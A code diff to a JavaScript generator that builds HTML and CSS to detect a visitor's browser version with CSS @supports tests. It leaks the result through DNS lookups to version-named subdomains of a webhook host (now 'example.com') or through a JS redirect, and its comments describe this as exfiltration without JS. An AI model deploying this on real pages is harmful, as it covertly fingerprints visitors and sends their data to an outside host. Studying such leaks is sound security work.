@@ -1,4 +1,4 @@
-var webhook_url = "webhook-url"
+var webhook_url = "example.com"
 
 tests = {
 	'hwb-color-notation':'@supports (color: hwb(194 0% 0% / .5))',
@@ -108,6 +108,8 @@ features = {
 }
 
 var html = "";
+// html = html.concat(`<meta http-equiv="Content-Security-Policy" content="default-src 'none'; script-src 'unsafe-inline'; style-src 'unsafe-inline'">`)
+
 var css = ""
 var js = ""
 var versions = Array.from(new Array(52), (x, i) => i + 100);
@@ -146,12 +148,35 @@ for (feature in features) {
 	i++;
 }
 
-// exfiltrate through DNS without JS
-html = html.concat(`<div id=versions style="display:flex; gap:5px">
+// exfiltrate with js, no csp (after 2 sec)
+js = js.concat(`
+	setTimeout(() => {
+		[...document.querySelectorAll("#versions iframe")].filter(el => getComputedStyle(el).getPropertyValue("display") === "block").forEach(el => location = '/' + el.dataset.version)
+	}, 2000)
+`)
+
+
+// exfiltrate through DNS without JS (iframes)
+// correct version will be last dns request, increase animation duration for more delay
+css = css.concat(`
+#versions {
+  position:fixed;
+  left: -9999;
+  animation: show 0s linear 1s forwards;
+}
+
+@keyframes show {
+  to {
+    left: 0;
+  }
+}
+`)
+
+html = html.concat(`<div id=versions style="display:flex; gap:5px;">
 ${versions.map((version, i) => `<p data-version="${version}"">${version}</p>`).join("")}
-${versions.map((version, i) => `<img loading="lazy" src="https://${version}.${Math.floor(Date.now() / 1000)}.${webhook_url}" data-version="${version}"">`).join("")}
+${versions.map((version, i) => `<iframe loading="lazy" src="https://${version}.${webhook_url}/" data-version="${version}"></iframe>`).join("")}
 </div>
 `)
 
-html = `${html}<style>${css}</style><script>${js}</script>`
+html = `${html}<style>${css}</style><script defer>${js}</script>`
 console.log(html)
